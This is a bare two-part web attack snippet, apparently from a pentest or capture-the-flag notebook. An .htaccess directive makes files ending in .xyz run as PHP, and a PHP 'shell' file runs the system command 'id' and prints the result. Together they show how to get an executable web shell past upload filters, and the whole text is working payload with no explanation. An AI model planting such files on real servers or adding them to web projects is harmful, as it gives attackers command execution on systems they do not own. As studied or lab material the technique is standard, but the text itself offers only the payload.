.htaccess : AddType application/x-httpd-php .xyz

shell: 
        <?php
        define('CMD' , 'id');
        
        echo '<pre>' . exec(CMD) .'<pre>' ;
        
        ?>
